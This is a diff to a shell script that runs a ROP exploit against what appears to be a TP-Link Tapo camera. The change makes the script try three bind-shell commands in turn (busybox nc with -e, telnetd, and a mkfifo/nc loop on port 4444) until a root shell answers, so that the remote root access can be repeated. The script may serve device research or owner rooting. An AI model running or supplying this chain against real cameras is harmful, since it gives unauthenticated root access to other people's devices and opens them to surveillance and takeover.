@@ -75,12 +75,30 @@ ARGS=$(awk '/tapo_connectap_rop\.py/ { sub(/^.*--offset /, "--offset "); print }
 log "chain: $ARGS"
 
 # --- 3. repeatable ROP shell -----------------------------------------------------------------
-# shellcheck disable=SC2086
-"$ROP_TOOL" "$HOST" $ARGS \
-  --cmd "/bin/busybox nc -lk -p 4444 -e /bin/sh &" 2>&1 | tee -a "$LOG"
-sleep 2
-wait_shell "$WAIT" || die "the ROP shell never came back — repeat the ROP by hand" 5
-log "repeatable root shell up"
+# The one-shot bind shell dies with the crashed worker, so a *repeatable* listener must be installed
+# before anything else. Whether the vendor busybox carries the `nc -e` applet is not provable
+# host-side (the root partition is not decodable offline — tapo-c660-gadgets.md §7), and a candidate
+# that silently produces no listener would waste the only root window. So the shapes are tried in
+# order and each one is judged by an actual connect. Every attempt costs one worker restart; the
+# stack address does not change within the boot, so a failed candidate is cheap.
+SHELL_CMD=""
+rop_try() { # command
+  log "rop: $1"
+  # shellcheck disable=SC2086
+  "$ROP_TOOL" "$HOST" $ARGS --cmd "$1" 2>&1 | tee -a "$LOG"
+  sleep 2
+  wait_shell "${ROP_WAIT:-10}"     # short: a dead candidate must not eat the window
+}
+for cand in \
+  '/bin/busybox nc -lk -p 4444 -e /bin/sh &' \
+  '/bin/busybox telnetd -l /bin/sh -p 4444 &' \
+  'rm -f /tmp/fssf; /bin/busybox mkfifo /tmp/fssf; (while :; do /bin/busybox nc -l -p 4444 < /tmp/fssf | /bin/sh > /tmp/fssf 2>&1; done) &'
+do
+  rop_try "$cand" && { SHELL_CMD="$cand"; break; }
+  log "  no listener from that shape — next candidate"
+done
+[ -n "$SHELL_CMD" ] || die "no repeatable shell came back (nc -e, telnetd and the fifo loop all failed)" 5
+log "repeatable root shell up via: $SHELL_CMD"
 
 [ "$SKIP_RTSP" = 1 ] && { log "RTSP skipped (--skip-rtsp)"; exit 0; }
 
